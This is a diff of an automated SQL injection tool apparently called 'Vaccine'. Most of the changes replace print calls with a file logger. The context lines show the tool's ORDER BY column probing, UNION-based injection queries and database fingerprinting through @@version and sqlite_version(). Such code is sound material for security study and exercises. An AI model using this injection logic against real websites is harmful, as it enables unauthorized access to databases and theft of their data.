@@ -37,12 +37,6 @@ def form_url(url, add):
 	baseurl = baseurl_match.group()
 	return baseurl + '/' + add
 
-def log_to_file(str1, str2):
-	with open("log.txt", "w") as f:
-		f.write(str1)
-	with open("log2.txt", "w") as f:
-		f.write(str2)
-
 def get_diff(str1, str2):
 	diff = difflib.unified_diff(str1.splitlines(), str2.splitlines(), n = 0)
 	ret = ""
@@ -64,7 +58,23 @@ def get_result(str1, str2, query=""):
 	result = re.sub('\n+', '\n', result)
 	if query:
 		result = result.replace(query, "[query]")
-	return result[:500]
+	return result
+
+class Log:
+	def __init__(self, filename):
+		self.data = ""
+		self.filename = filename
+
+	def log(self, msg, color=""):
+		if color:
+			print(color + msg[:500] + Style.RESET)
+		else:
+			print(msg[:500])
+		self.data = self.data + msg
+
+	def to_file(self):
+		with open(self.filename, "w") as f:
+			f.write(self.data)
 
 class VaccineHelper:
 	def __init__(self, submit, comment):
@@ -79,7 +89,7 @@ class Error:
 		pass
 
 	def __init__(self, helper):
-		print(f"{Style.GREEN}< ERROR comment:{helper.comment} >{Style.RESET}")
+		logger.log(f"< ERROR comment:{helper.comment} >", Style.GREEN)
 		self.submit = helper.submit
 		self.delimiter = helper.delimiter
 		self.comment = helper.comment
@@ -92,7 +102,7 @@ class Error:
 			q = f" ORDER BY {i}"
 			query = self.delimiter + q + self.comment
 			res = self.submit(query)
-			print(f"{Style.CYAN}QUERY: {query}{Style.RESET}")
+			logger.log(f"QUERY: {query}", Style.CYAN)
 			result = get_diff(self.original_text, res.text)
 			if res.text and not result:
 				flag = 1
@@ -107,7 +117,7 @@ class Error:
 		column_counts = i - flag
 		if column_counts == 0 or column_counts >= 10:
 			raise self.ErrorException("this method does not work")
-		print(f"column counts: {column_counts}")
+		logger.log(f"column counts: {column_counts}")
 		return column_counts
 
 class Union:
@@ -115,7 +125,7 @@ class Union:
 		pass
 
 	def __init__(self, helper, get_input, column_counts):
-		print(f"{Style.GREEN}< UNION comment:{helper.comment} >{Style.RESET}")
+		logger.log(f"< UNION comment:{helper.comment} >", Style.CYAN)
 		self.submit = helper.submit
 		self.delimiter = helper.delimiter
 		self.header = self.delimiter + " UNION "
@@ -140,28 +150,27 @@ class Union:
 
 	def exec_union(self, column_name, contents):
 		response, query = self.submit_query(column_name, contents)
-		print(f"{Style.CYAN}QUERY: {query}{Style.RESET}")
+		logger.log(f"QUERY: {query}", Style.CYAN)
 		result = get_result(self.original_text, response, query)
 		if not result:
 			raise self.UnionException("this method does not work")
-		print(result)
+		logger.log(result[:500])
 
 	def check_union(self, column_name, compare):
 		response, query = self.submit_query(column_name)
 		result = get_result(compare, response)
-		log_to_file(compare, response)
-		#print(result)
+		#logger.log(result)
 		return result
 
 	def get_version(self):
 		response, query = self.submit_query("error")
 		result = self.check_union("@@version", response)
 		if result:
-			print(f"{Style.GREEN}mode: MYSQL{Style.RESET}")
+			logger.log(f"mode: MYSQL", Style.GREEN)
 			return
 		result = self.check_union("sqlite_version()", response)
 		if result:
-			print(f"{Style.GREEN}mode: SQLite{Style.RESET}")
+			logger.log(f"mode: SQLite", Style.GREEN)
 			self.mysql = False
 
 	def read_input(self, name):
@@ -233,9 +242,8 @@ class Union:
 			error_exit(e)
 
 class Vaccine:
-	def __init__(self, url, file, method, get_input):
+	def __init__(self, url, method, get_input):
 		self.url = url
-		self.file = file
 		self.method = method
 		self.get_input = get_input
 
@@ -271,7 +279,7 @@ class Vaccine:
 			if method_match.group(1).lower() != self.method:
 				continue
 			filtered_froms.append(form[0])
-		#print(forms)
+		#logger.log(forms)
 		if not filtered_froms:
 			error_exit("method does not match")
 		if len(filtered_froms) > 1:
@@ -315,7 +323,7 @@ class Vaccine:
 				self.username_field_name: username,
 				"Submit" : "Submit"
 			}
-		#print(f"payload {payload}")
+		#logger.log(f"payload {payload}")
 		res = requests.get(self.request_url, params=payload, cookies=cookies)
 		if self.method == "get":
 			res = requests.get(self.request_url, params=payload, cookies=cookies)
@@ -332,8 +340,8 @@ class Vaccine:
 			u.union()
 		except Error.ErrorException or Union.UnionException as e:
 			error_continue(e)
-		except Exception as e:
-			error_exit(e)
+		#except Exception as e:
+		#	error_exit(e)
 		try:
 			v = VaccineHelper(self.submit, "--")
 			e = Error(v)
@@ -342,8 +350,8 @@ class Vaccine:
 			u2.union()
 		except Error.ErrorException or Union.UnionException as e:
 			error_continue(e)
-		except Exception as e:
-			error_exit(e)
+		#except Exception as e:
+		#	error_exit(e)
 
 def validate_args(args):
 	if not args.url.startswith('https://') and \
@@ -356,7 +364,7 @@ def validate_args(args):
 def parse_args():
 	parser = argparse.ArgumentParser()
 	parser.add_argument("url", metavar="URL", type=str)
-	parser.add_argument("-o", type=str, default="archive.txt",
+	parser.add_argument("-o", type=str, default="log.txt",
 		help="Archive file, if not specified it will be stored in a default one.")
 	parser.add_argument("-x", type=str, default="GET",
 		help="Type of request, if not specified GET will be used.")
@@ -369,9 +377,12 @@ def parse_args():
 def main():
 	args = parse_args()
 	validate_args(args)
-	vaccine = Vaccine(args.url, args.o, args.x, args.i)
+	global logger
+	logger = Log(args.o)
+	vaccine = Vaccine(args.url, args.x, args.i)
 	vaccine.vaccine()
 	print(vaccine)
+	logger.to_file()
 
 if __name__ == '__main__':
 	main()
